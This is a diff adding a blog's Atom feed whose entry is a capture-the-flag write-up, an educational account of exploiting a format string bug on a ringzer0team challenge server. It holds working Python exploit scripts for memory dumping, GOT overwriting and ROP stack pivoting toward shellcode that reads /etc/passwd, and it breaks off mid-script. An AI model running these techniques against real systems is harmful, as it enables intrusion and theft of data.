@@ -1,0 +1,870 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Ringzer0team | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/ringzer0team/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2015-02-22T18:21:49+01:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution]]></title>
+    <link href="http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/"/>
+    <updated>2015-02-22T13:01:22+01:00</updated>
+    <id>http://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution</id>
+    <content type="html"><![CDATA[<p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>
+
+<!-- more -->
+
+
+<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>
+
+<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>
+
+<h2>Dumping the Stack</h2>
+
+<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>
+
+<pre><code class="c">    char *response = NULL;
+    char *cleanBuffer = NULL;
+
+    response = (char*)malloc(2048);
+    memset(response, 0, 2048);
+
+    cleanBuffer = (char*)malloc(strlen(buf));
+    memset(cleanBuffer, 0, strlen(buf));
+
+    strncpy(cleanBuffer, buf, strlen(buf) - 1);
+
+    char test[] = "AAAABBBBCCCC";
+    char flag[] = "XXXXXXXXXXXXXXXXXXXXXXXXXX";
+
+    if(strcmp(flag, cleanBuffer) == 0) {
+        strcpy(response, "Here's your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.\n");
+    } else {
+        sprintf(response, cleanBuffer); // &lt;-- we have a format string vulnerability here
+        sprintf(response, "%s is a wrong password.\n\nPassword:", response);
+    }
+</code></pre>
+
+<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
+HF Remote Secure Shell [1.3.37]
+
+Password:%lx-%lx-%lx-%lx-%lx-%lx-
+17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
+</code></pre>
+
+<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>
+
+<p><img src="/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>
+
+<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>
+
+<pre><code class="python">import struct
+from socket import *
+
+def grab(i):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(i)+'$lx\n')
+
+    data = s.recv(64)
+    addr = data.split()[0]
+
+    print i, addr
+    s.close()
+
+for z in range(700):
+    grab(z)
+</code></pre>
+
+<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>
+
+<pre><code>...snip...
+633 7fffeecd9c28
+634 1c
+635 2
+636 7fff00000042
+637 7fffeecdaf65
+638 0
+...snip...
+</code></pre>
+
+<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>
+
+<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
+HF Remote Secure Shell [1.3.37]
+
+Password:%636$lx
+7fff3ca49f51 is a wrong password.
+
+Password:%636$s
+/home/crackme/fs_64 is a wrong password.
+</code></pre>
+
+<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>
+
+<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
+HF Remote Secure Shell [1.3.37]
+
+Password:%636$lx
+7fff3ca49f51 is a wrong password.
+
+Password:%636$s
+/home/crackme/fs_64 is a wrong password.
+
+Password:%66c%636$hhn                  
+                                                                 � is a wrong password.
+
+Password:%636$s
+Bhome/crackme/fs_64 is a wrong password.
+</code></pre>
+
+<h2>Write what where now?</h2>
+
+<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>
+
+<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>
+
+<pre><code class="python">import struct
+from socket import *
+
+def grab_value_directly(i):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(i)+'$lx\n')
+
+    data = s.recv(64)
+    addr = int(data.split()[0], 16)
+
+    s.close()
+    return addr
+
+def grab_value_indirectly(i):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(i)+'$s\n')
+
+    data = s.recv(64)
+    addr = data.split()[0]
+
+    # ugly workaround, only grab 8 bytes. will fix this later!
+    if len(addr) &gt; 8:
+        address = addr[0:8]
+    else:
+        address = addr + '\x00' * (8-len(addr))
+
+    s.close()
+    return struct.unpack('L', address)[0]
+
+def write_byte_value_via(i, value):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
+    data = s.recv(64)
+
+    s.close()
+
+parameter_636_addr = grab_value_directly(5)
+print "parameter 5 points to: ", hex(parameter_636_addr)
+value_at_636 = grab_value_indirectly(5)
+print "address pointed to by parameter 5 contains: ", hex(value_at_636)
+
+# this will write out 'BAS',0 to the scratch area!
+# update the pointer
+write_byte_value_via(5, 1)
+# write a byte to the scratch area
+write_byte_value_via(636, ord('B'))
+# update the pointer
+write_byte_value_via(5, 2)
+# write a byte to the scratch area
+write_byte_value_via(636, ord('A'))
+write_byte_value_via(5, 3)
+write_byte_value_via(636, ord('S'))
+write_byte_value_via(5, 4)
+# write out a NULL byte first writing out 256 bytes (which wraps to 0x00)
+write_byte_value_via(636, 256)
+
+# reset the pointer
+write_byte_value_via(5, 1)
+
+value_at_scratch = grab_value_indirectly(636)
+print "scratch contains: ", hex(value_at_scratch)
+
+format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
+print "scratch is parameter {}".format(636+format_offset)
+
+# CAN ADDRESS IT DIRECTLY!!
+scratch_addr = grab_value_directly(636+format_offset)
+print "scratch contains: ", hex(scratch_addr)
+</code></pre>
+
+<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit1.py 
+parameter 5 points to:  0x7fff3ca480d8
+address pointed to by parameter 5 contains:  0x7fff3ca49f51
+scratch contains:  0x534142
+scratch is parameter 1601
+scratch contains:  0x53414200
+</code></pre>
+
+<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>
+
+<h2>Slam Dump </h2>
+
+<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>
+
+<pre><code class="python">import struct
+from socket import *
+
+def grab_value_directly(i):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(i)+'$lx\n')
+
+    data = s.recv(64)
+    addr = int(data.split()[0], 16)
+
+    s.close()
+    return addr
+
+def grab_value_indirectly(i):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(i)+'$s\n')
+
+    data = s.recv(64)
+    addr = data.split()[0]
+
+    # ugly workaround, only grab 8 bytes. will fix this later!
+    if len(addr) &gt; 8:
+        address = addr[0:8]
+    else:
+        address = addr + '\x00' * (8-len(addr))
+
+    s.close()
+    return struct.unpack('L', address)[0]
+
+def write_byte_value_via(i, value):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
+    data = s.recv(64)
+
+    s.close()
+
+def read_from_address(addr, offset):
+    for i in range(4):
+        b = (addr &amp; 0xff)
+        addr &gt;&gt;= 8
+        if b == 0:
+            b = 256
+        if i == 0:
+            i = 256
+        write_byte_value_via(5, i)      # change address
+        write_byte_value_via(636, b)    # write byte
+
+    dump1 = grab_value_indirectly(636+offset)
+    return hex(dump1)
+
+parameter_636_addr = grab_value_directly(5)
+print "parameter 5 points to: ", hex(parameter_636_addr)
+value_at_636 = grab_value_indirectly(5)
+print "address pointed to by parameter 5 contains: ", hex(value_at_636)
+
+value_at_scratch = grab_value_indirectly(636)
+print "scratch contains: ", hex(value_at_scratch)
+
+format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
+print "scratch is parameter {}".format(636+format_offset)
+
+print "read from 0x400000: {}".format(read_from_address(0x400000, format_offset))
+</code></pre>
+
+<pre><code class="bash">bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5$ python sploit3.py
+parameter 5 points to:  0x7fff3ca480d8
+address pointed to by parameter 5 contains:  0x7fff3ca49f01
+scratch contains:  0x7369
+scratch is parameter 1601
+read from 0x400000: 0x10102464c457f
+</code></pre>
+
+<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>
+
+<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>
+
+<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>
+
+<pre><code class="bash">...snip...
+00014a0: ffc7 8580 edff ff41 4141 41c7 8584 edff  .......AAAA.....
+00014b0: 0042 4242 42c7 8588 edff ff43 4343 43c6  .BBBB......CCCC
+...snip...
+</code></pre>
+
+<p>This looks familiar, doesn&rsquo;t it?</p>
+
+<pre><code class="c">char test[] = "AAAABBBBCCCC";
+</code></pre>
+
+<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>
+
+<pre><code class="bash">$ xxd -c 1 dump |grep 1260 -A512 | awk '{print $2}' |tr -d '\n'
+b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
+65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
+...snip...
+</code></pre>
+
+<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>
+
+<pre><code class="bash">$ echo 'b800...' | rasm2 -d -b 64 -o 0x401260 -
+
+mov dword [rbp-0x50], 0x0
+mov eax, [rbp-0x20]
+cmp eax, [rbp-0x1c]
+jnz dword 0x4015d1
+// char *response = NULL;
+mov qword [rbp-0x58], 0x0       
+// char *cleanBuffer = NULL;
+mov qword [rbp-0x60], 0x0   
+// response = (char*)malloc(2048);  
+mov edi, 0x800                  
+call dword 0x400ba0             
+mov [rbp-0x58], rax
+// memset(response, 0, 2048);
+mov rax, [rbp-0x58]
+mov edx, 0x800
+mov esi, 0x0
+mov rdi, rax
+call dword 0x400b40
+// cleanBuffer = (char*)malloc(strlen(buf));
+lea rax, [rbp-0x11f0]
+mov rdi, rax
+call dword 0x400b00 
+mov rdi, rax
+call dword 0x400ba0
+mov [rbp-0x60], rax
+lea rax, [rbp-0x11f0]
+</code></pre>
+
+<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>
+
+<pre><code>0000b00: ff25 fa0f 0000 6807 0000 00e9 70ff ffff  .%....h.....p...
+</code></pre>
+
+<p>This disassembles to</p>
+
+<pre><code class="bash">$ rasm2 -d -b 64 -o 0x400b00 -
+ff25fa0f0000
+jmp qword [rip+0xffa]
+</code></pre>
+
+<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>
+
+<h2>libc Version: Computer Says No</h2>
+
+<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>
+
+<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>
+
+<pre><code>0000f70: 5348 83ec 1048 85ff 7416 8b05 4ca9 3400  SH...H..t...L.4.
+0000f80: 85c0 7526 4883 c410 5be9 82fb ffff 6690  ..u&amp;H...[.....f.
+</code></pre>
+
+<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>
+
+<pre><code>objdump -d -M intel libc-2.13.so |grep system -A10
+
+000000000003fc70 &lt;__libc_system&gt;:
+   3fc70:   53                      push   rbx
+   3fc71:   48 83 ec 10             sub    rsp,0x10
+   3fc75:   48 85 ff                test   rdi,rdi
+   3fc78:   74 16                   je     3fc90 &lt;__libc_system+0x20&gt;
+   3fc7a:   8b 05 6c b9 34 00       mov    eax,DWORD PTR [rip+0x34b96c]        # 38b5ec &lt;argp_program_version_hook+0x1b4&gt;
+   3fc80:   85 c0                   test   eax,eax
+   3fc82:   75 26                   jne    3fcaa &lt;__libc_system+0x3a&gt;
+   3fc84:   48 83 c4 10             add    rsp,0x10
+   3fc88:   5b                      pop    rbx
+   3fc89:   e9 82 fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
+   3fc8e:   66 90                   xchg   ax,ax
+</code></pre>
+
+<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>
+
+<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
+// disassembly:
+lea rax, [rbp-0x11f0]
+mov rdi, rax
+call dword 0x400b00 &lt; the GOT entry for strlen will be pointing to system!
+</code></pre>
+
+<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>
+
+<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>
+
+<pre><code class="python">def write_on_stack(what, where, offset):
+    # write out all the bytes of what
+    # used to write addresses on the stack
+    for i in range(8):
+        b = (what &amp; 0xff)
+        what &gt;&gt;= 8
+        if b == 0:
+            b = 256
+        if (i+where) == 0:
+            i = 256
+        write_byte_value_via(5, i+where)
+        write_byte_value_via(636, b)
+    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)
+
+parameter_636_addr = grab_value_directly(5)
+print "parameter 5 points to: ", hex(parameter_636_addr)
+value_at_636 = grab_value_indirectly(5)
+print "address pointed to by parameter 5 contains: ", hex(value_at_636)
+
+value_at_scratch = grab_value_indirectly(636)
+print "scratch contains: ", hex(value_at_scratch)
+
+format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
+print "scratch is parameter {}".format(636+format_offset)
+
+# grab strlen from the GOT entry
+strlen_addr = read_from_address(0x601b00, format_offset)
+
+print "[+] strlen is at {}.".format(hex(strlen_addr))
+# from libc-2.13-38 -- NOT CORRECT
+libc_base = strlen_addr - 0x80b70
+print "[+] libc_base is at {}.".format(hex(libc_base))
+
+# we need to have three addresses on the stack which we can directly address
+# to use them in the format string vuln 
+write_on_stack(0x601e20, 0, format_offset)
+write_on_stack(0x601e21, 8, format_offset)
+write_on_stack(0x601e22, 16, format_offset)
+
+# ok, now try to set three bytes in one go
+s = socket(AF_INET, SOCK_STREAM)
+s.connect(('pwn01.ringzer0team.com', 13377))
+
+# should write out "BAS" in one go
+payload = "%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)
+
+s.recv(128)
+s.send(payload)
+data = s.recv(64)
+s.close()
+
+# read it back to check!
+check = read_from_address(0x601e20, format_offset)
+print hex(check)
+</code></pre>
+
+<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>
+
+<pre><code>"%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)
+</code></pre>
+
+<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>
+
+<pre><code class="bash">$ python sploit7.py 
+parameter 5 points to:  0x7fff3ca480d8
+address pointed to by parameter 5 contains:  0x7fff3ca49f01
+scratch contains:  0x601b
+scratch is parameter 1601
+[+] strlen is at 0x7f82b7326c40.
+[+] libc_base is at 0x7f82b72a60d0.
+[+] wrote 0x601e20 to 1601
+[+] wrote 0x601e21 to 1602
+[+] wrote 0x601e22 to 1603
+
+0x534142
+</code></pre>
+
+<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>
+
+<h2>Reaching out</h2>
+
+<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>
+
+<p>&hellip;Challenge accepted! :)</p>
+
+<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>
+
+<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>
+
+<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>
+
+<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>
+
+<h2>Pivot the Stack</h2>
+
+<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>
+
+<pre><code class="c">strncpy(cleanBuffer, buf, strlen(buf) - 1);
+</code></pre>
+
+<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>
+
+<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
+// dissambled:
+lea rax, [rbp-0x11f0]
+mov rdi, rax        // rax and rdi now point to buf
+call dword 0x400b00 // strlen
+</code></pre>
+
+<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>
+
+<pre><code>stack lifting
+syscall
+pop rax
+pop rdi
+pop rsi
+pop rdx
+</code></pre>
+
+<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>
+
+<pre><code>0x041cf9: ret
+</code></pre>
+
+<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>
+
+<h2>Grabbing the socket descriptor value</h2>
+
+<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>
+
+<pre><code>0x0002028a : pop r15; ret
+0x0006933f : lea rax, [rbp + r15]; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+0x000eb938 : mov rax, [rax]; ret
+0x0002c10e : xchg eax, edi; ret
+</code></pre>
+
+<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>
+
+<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>
+
+<h2>Putting it all together</h2>
+
+<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>
+
+<p>Without further ado:</p>
+
+<pre><code class="python">import struct, time
+from socket import *
+
+def p(x):
+    return struct.pack('L', x &amp; 0xffffffffffffffff)
+
+def grab_value_directly(i):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(i)+'$lx\n')
+
+    data = s.recv(64)
+    addr = int(data.split()[0], 16)
+
+    s.close()
+    return addr
+
+def grab_value_indirectly(i):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(i)+'$s\n')
+
+    data = s.recv(64)
+    addr = data.split()[0]
+
+    # ugly workaround, only grab 8 bytes. will fix this later!
+    if len(addr) &gt; 8:
+        address = addr[0:8]
+    else:
+        address = addr + '\x00' * (8-len(addr))
+
+    s.close()
+    return struct.unpack('L', address)[0]
+
+def write_byte_value_via(i, value):
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(('pwn01.ringzer0team.com', 13377))
+
+    s.recv(128)
+    s.send('%'+str(value)+'c%'+str(i)+'$hhn\n')
+    data = s.recv(64)
+
+    s.close()
+
+def read_from_address(addr, offset):
+    for i in range(4):
+        b = (addr &amp; 0xff)
+        addr &gt;&gt;= 8
+        if b == 0:
+            b = 256
+        if i == 0:
+            i = 256
+        write_byte_value_via(5, i)      # change address
+        write_byte_value_via(636, b)        # write byte
+
+    dump1 = grab_value_indirectly(636+offset)
+    return dump1
+
+# write a value to a string format parameter
+def write_on_stack(what, where, offset):
+    # write out all the bytes of what
+    for i in range(8):
+        b = (what &amp; 0xff)
+        what &gt;&gt;= 8
+        if b == 0:
+            b = 256
+        if (i+where) == 0:
+            i = 256
+        write_byte_value_via(5, i+where)
+        write_byte_value_via(636, b)
+    print "[+] wrote {} to {}".format(hex(grab_value_directly(636+offset+where/8)), 636+offset+where/8)
+
+parameter_636_addr = grab_value_directly(5)
+print "parameter 5 points to: ", hex(parameter_636_addr)
+value_at_636 = grab_value_indirectly(5)
+print "address pointed to by parameter 5 contains: ", hex(value_at_636)
+
+value_at_scratch = grab_value_indirectly(636)
+print "scratch contains: ", hex(value_at_scratch)
+
+format_offset = ((value_at_636 &amp; 0xffffffffffffff00) - parameter_636_addr)/8
+print "scratch is parameter {}".format(636+format_offset)
+
+# grab strlen from the GOT entry
+strlen_addr = read_from_address(0x601b00, format_offset)
+
+print "[+] strlen is at {}.".format(hex(strlen_addr))
+libc_base = strlen_addr - 0x80c40
+print "[+] libc_base is at {}.".format(hex(libc_base))
+
+STACK_PIVOT = libc_base + 0x082cfe      # add rsp, 0x100; ret
+print "[+] stack pivot gadget is at {}.".format(hex(STACK_PIVOT))
+
+# we need to have three addresses on the stack which we can directly address
